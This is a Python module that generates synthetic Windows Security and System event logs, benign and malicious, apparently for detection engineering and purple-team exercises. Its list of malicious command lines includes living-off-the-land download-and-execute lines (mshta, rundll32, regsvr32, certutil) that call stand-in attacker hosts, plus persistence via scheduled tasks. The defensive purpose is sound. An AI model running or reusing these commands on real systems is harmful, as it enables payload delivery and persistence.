"""Windows Event Log source generator.

Generates realistic Windows Security/System event log entries for common
Event IDs used in detection engineering and purple team exercises.
"""
from __future__ import annotations

import random
import uuid
from datetime import datetime, timezone, timedelta
from typing import Any

from backend.log_sources.base_log_source import AbstractLogSource


# ── Static data pools ────────────────────────────────────────────────────────

_HOSTNAMES = [
    "WKSTN-FIN-042", "SRV-DC-01", "WKSTN-HR-019", "SRV-FILE-03",
    "SRV-WEB-01", "WKSTN-ENG-107", "SRV-DB-02", "WKSTN-EXEC-003",
    "SRV-MAIL-01", "WKSTN-IT-055", "SRV-APP-04", "LAPTOP-REMOTE-22",
    "WKSTN-SALES-08", "SRV-BACKUP-01", "WKSTN-DEV-33",
]

_USERNAMES = [
    "jsmith", "jane.doe", "michael.chen", "sarah.wilson", "bob.johnson",
    "alice.martinez", "david.kim", "emily.taylor", "svc_backup", "svc_sql",
    "svc_web", "Administrator", "Guest", "SYSTEM",
]

_DOMAINS = ["CORP", "ACME", "INTERNAL", "HQ", "DEV"]

_INTERNAL_IPS = [
    f"10.10.{b}.{d}"
    for b in range(1, 5)
    for d in [10, 20, 30, 40, 50, 100, 150, 200]
]

_ATTACK_PROCESSES = [
    ("cmd.exe",        r"C:\Windows\System32\cmd.exe"),
    ("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"),
    ("wscript.exe",    r"C:\Windows\System32\wscript.exe"),
    ("mshta.exe",      r"C:\Windows\System32\mshta.exe"),
    ("rundll32.exe",   r"C:\Windows\System32\rundll32.exe"),
    ("regsvr32.exe",   r"C:\Windows\System32\regsvr32.exe"),
    ("certutil.exe",   r"C:\Windows\System32\certutil.exe"),
    ("msiexec.exe",    r"C:\Windows\System32\msiexec.exe"),
    ("cscript.exe",    r"C:\Windows\System32\cscript.exe"),
    ("schtasks.exe",   r"C:\Windows\System32\schtasks.exe"),
]

_BENIGN_PROCESSES = [
    ("explorer.exe",  r"C:\Windows\explorer.exe"),
    ("chrome.exe",    r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    ("notepad.exe",   r"C:\Windows\System32\notepad.exe"),
    ("svchost.exe",   r"C:\Windows\System32\svchost.exe"),
    ("lsass.exe",     r"C:\Windows\System32\lsass.exe"),
    ("taskmgr.exe",   r"C:\Windows\System32\taskmgr.exe"),
    ("outlook.exe",   r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"),
]

_TASK_NAMES = [
    "WindowsUpdateHelper", "SystemMaintenanceTask", "SyncTask",
    "AdobeFlashUpdater", "GoogleUpdateTaskMachineCore", "persist_beacon",
    "SvcRestart", "HealthCheck", "LogRotate",
]

_SERVICE_NAMES = [
    "WinDefHelper", "SvcMonitor", "RemoteAccessSvc", "UpdateHelper",
    "TelemetrySvc", "RpcBridgeSvc", "NetLogonHelper",
]

_REGISTRY_KEYS = [
    r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    r"HKLM\SYSTEM\CurrentControlSet\Services",
    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
]

_SECURITY_GROUPS = [
    "Domain Admins", "Administrators", "Remote Desktop Users",
    "Backup Operators", "Enterprise Admins", "Server Operators",
]

_LOGON_CMDLINES = [
    r"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0A",
    r"powershell.exe -ExecutionPolicy Bypass -File C:\Temp\update.ps1",
    r"cmd.exe /c whoami /all",
    r"cmd.exe /c net user /domain",
    r"wscript.exe C:\Users\Public\payload.vbs",
    'mshta.exe vbscript:Close(Execute("GetObject(""script:http://evil.example.com/payload.sct"")"))',
    r"certutil.exe -urlcache -split -f http://192.168.1.100/beacon.exe C:\Temp\beacon.exe",
    'rundll32.exe javascript:"\\\\..\\mshtml,RunHTMLApplication";document.write();GetObject("script:http://evil.example.com/run.sct")',
    r"schtasks /create /tn persist /tr C:\Temp\beacon.exe /sc onlogon /ru SYSTEM",
    r"regsvr32.exe /s /u /i:http://evil.example.com/file.sct scrobj.dll",
]


def _ts(offset_seconds: int = 0) -> str:
    """Return an ISO-8601 UTC timestamp, optionally shifted."""
    return (datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)).isoformat()


def _rand_hex(length: int) -> str:
    return "".join(random.choices("0123456789abcdef", k=length))


class WindowsEventLogSource(AbstractLogSource):
    source_type = "windows_eventlog"
    description = "Windows Security/System/Application Event Logs"

    # ── internal helpers ──────────────────────────────────────────────────────

    def _base(self, event_id: int, channel: str = "Security") -> dict[str, Any]:
        return {
            "EventID": event_id,
            "TimeCreated": _ts(random.randint(0, 3600)),
            "Computer": random.choice(_HOSTNAMES),
            "Channel": channel,
            "RecordID": random.randint(100000, 9999999),
            "ActivityID": str(uuid.uuid4()),
        }

    def _gen_4624(self, malicious: bool) -> dict[str, Any]:
        """Logon Success."""
        logon_type = random.choice([2, 3, 10] if malicious else [2, 3])
        subject_user = random.choice(_USERNAMES)
        target_user = random.choice(_USERNAMES)
        domain = random.choice(_DOMAINS)
        ev = self._base(4624)
        ev.update({
            "SubjectUserName": subject_user,
            "SubjectDomainName": domain,
            "TargetUserName": target_user,
            "TargetDomainName": domain,
            "LogonType": logon_type,
            "LogonProcessName": random.choice(["User32", "NtLmSsp", "Kerberos"]),
            "AuthenticationPackageName": random.choice(["NTLM", "Kerberos", "Negotiate"]),
            "WorkstationName": random.choice(_HOSTNAMES),
            "LogonGuid": str(uuid.uuid4()),
            "SourceNetworkAddress": random.choice(_INTERNAL_IPS) if not malicious
                                    else f"185.220.{random.randint(1,254)}.{random.randint(1,254)}",
            "SourcePort": random.randint(49152, 65535),
            "ElevatedToken": random.choice(["%%1842", "%%1843"]),
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4625(self, malicious: bool) -> dict[str, Any]:
        """Logon Failure."""
        ev = self._base(4625)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "TargetUserName": random.choice(_USERNAMES + ["Administrator", "admin", "root"]),
            "TargetDomainName": random.choice(_DOMAINS),
            "Status": "0xC000006D",
            "SubStatus": random.choice(["0xC000006A", "0xC0000064", "0xC000006D"]),
            "FailureReason": "%%2313",
            "LogonType": random.choice([2, 3, 8]),
            "LogonProcessName": "NtLmSsp",
            "AuthenticationPackageName": "NTLM",
            "WorkstationName": random.choice(_HOSTNAMES),
            "SourceNetworkAddress": random.choice(_INTERNAL_IPS) if not malicious
                                    else f"91.219.{random.randint(1,254)}.{random.randint(1,254)}",
            "SourcePort": random.randint(49152, 65535),
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4688(self, malicious: bool) -> dict[str, Any]:
        """Process Creation."""
        if malicious:
            proc_name, proc_path = random.choice(_ATTACK_PROCESSES)
            cmdline = random.choice(_LOGON_CMDLINES)
        else:
            proc_name, proc_path = random.choice(_BENIGN_PROCESSES)
            cmdline = proc_path

        ev = self._base(4688)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "NewProcessId": f"0x{random.randint(0x100, 0xFFFF):04x}",
            "NewProcessName": proc_path,
            "ProcessName": proc_name,
            "CommandLine": cmdline,
            "ParentProcessName": random.choice([p for _, p in _BENIGN_PROCESSES]),
            "TokenElevationType": random.choice(["%%1936", "%%1937", "%%1938"]),
            "MandatoryLabel": random.choice([
                "S-1-16-8192", "S-1-16-12288", "S-1-16-16384"
            ]),
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4648(self, malicious: bool) -> dict[str, Any]:
        """Explicit Credential Use."""
        ev = self._base(4648)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "TargetUserName": random.choice(_USERNAMES),
            "TargetDomainName": random.choice(_DOMAINS),
            "TargetServerName": random.choice(_HOSTNAMES),
            "TargetInfo": random.choice(_HOSTNAMES),
            "ProcessName": random.choice([p for _, p in (_ATTACK_PROCESSES if malicious else _BENIGN_PROCESSES)]),
            "NetworkAddress": random.choice(_INTERNAL_IPS),
            "Port": random.randint(1, 65535),
            "LogonGuid": str(uuid.uuid4()),
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4657(self, malicious: bool) -> dict[str, Any]:
        """Registry Value Modification."""
        key = random.choice(_REGISTRY_KEYS)
        ev = self._base(4657)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "ObjectName": key,
            "ObjectValueName": random.choice(["Run", "Startup", "Shell", "Userinit"]),
            "OldValue": "",
            "NewValue": r"C:\Temp\malware.exe" if malicious else r"C:\Windows\System32\svchost.exe",
            "OldValueType": "%%1873",
            "NewValueType": "%%1873",
            "ProcessName": random.choice([p for _, p in (_ATTACK_PROCESSES if malicious else _BENIGN_PROCESSES)]),
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4698(self, malicious: bool) -> dict[str, Any]:
        """Scheduled Task Created."""
        task_name = random.choice(_TASK_NAMES)
        ev = self._base(4698)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "TaskName": f"\\Microsoft\\Windows\\{task_name}" if not malicious else f"\\{task_name}",
            "TaskContent": (
                f'<Task><Actions><Exec><Command>C:\\Temp\\beacon.exe</Command></Exec></Actions>'
                f'<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers></Task>'
                if malicious else
                f'<Task><Actions><Exec><Command>C:\\Windows\\System32\\svchost.exe</Command></Exec></Actions></Task>'
            ),
            "ClientProcessId": f"0x{random.randint(0x100, 0xFFFF):04x}",
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4702(self, malicious: bool) -> dict[str, Any]:
        """Scheduled Task Modified."""
        ev = self._gen_4698(malicious)
        ev["EventID"] = 4702
        return ev

    def _gen_4720(self, malicious: bool) -> dict[str, Any]:
        """User Account Created."""
        new_user = f"svc_{_rand_hex(6)}" if malicious else f"user_{random.randint(100,999)}"
        ev = self._base(4720)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "TargetUserName": new_user,
            "TargetDomainName": random.choice(_DOMAINS),
            "TargetSid": f"S-1-5-21-{random.randint(1000000,9999999)}-{random.randint(1000000,9999999)}-{random.randint(1000,9999)}",
            "PrivilegeList": "-",
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_4732(self, malicious: bool) -> dict[str, Any]:
        """Member Added to Security-Enabled Group."""
        ev = self._base(4732)
        ev.update({
            "SubjectUserName": random.choice(_USERNAMES),
            "SubjectDomainName": random.choice(_DOMAINS),
            "MemberName": f"CN={random.choice(_USERNAMES)},DC=corp,DC=example,DC=com",
            "MemberSid": f"S-1-5-21-{random.randint(1000000,9999999)}-{random.randint(1000000,9999999)}-{random.randint(1000,9999)}",
            "TargetUserName": random.choice(_SECURITY_GROUPS),
            "TargetDomainName": random.choice(_DOMAINS),
            "TargetSid": f"S-1-5-21-{random.randint(1000000,9999999)}-{random.randint(1000000,9999999)}-512",
            "malicious_indicator": malicious,
        })
        return ev

    def _gen_7045(self, malicious: bool) -> dict[str, Any]:
        """New Service Installed (System channel)."""
        svc = random.choice(_SERVICE_NAMES)
        ev = self._base(7045, channel="System")
        ev.update({
            "ServiceName": svc if not malicious else f"svc_{_rand_hex(8)}",
            "ServiceFileName": (
                r"C:\Temp\malware_svc.exe" if malicious
                else rf"C:\Windows\System32\{svc.lower()}.exe"
            ),
            "ServiceType": random.choice(["user mode service", "kernel mode driver"]),
            "ServiceStartType": random.choice(["auto start", "demand start", "disabled"]),
            "ServiceAccount": random.choice(["LocalSystem", "NetworkService", "LocalService"]),
            "malicious_indicator": malicious,
        })
        return ev

    # ── dispatch table ────────────────────────────────────────────────────────

    _GENERATORS = [
        _gen_4624, _gen_4624, _gen_4624,   # weight benign logons higher
        _gen_4625,
        _gen_4688, _gen_4688,
        _gen_4648,
        _gen_4657,
        _gen_4698,
        _gen_4702,
        _gen_4720,
        _gen_4732,
        _gen_7045,
    ]

    # ── public API ────────────────────────────────────────────────────────────

    def generate(self, malicious: bool = False, technique_id: str = "") -> dict[str, Any]:
        gen_fn = random.choice(self._GENERATORS)
        return gen_fn(self, malicious)

    def generate_batch(
        self,
        count: int = 10,
        malicious_ratio: float = 0.1,
        technique_id: str = "",
    ) -> list[dict[str, Any]]:
        events: list[dict[str, Any]] = []
        malicious_count = max(0, min(count, round(count * malicious_ratio)))
        for i in range(count):
            is_malicious = i < malicious_count
            events.append(self.generate(malicious=is_malicious, technique_id=technique_id))
        random.shuffle(events)
        return events
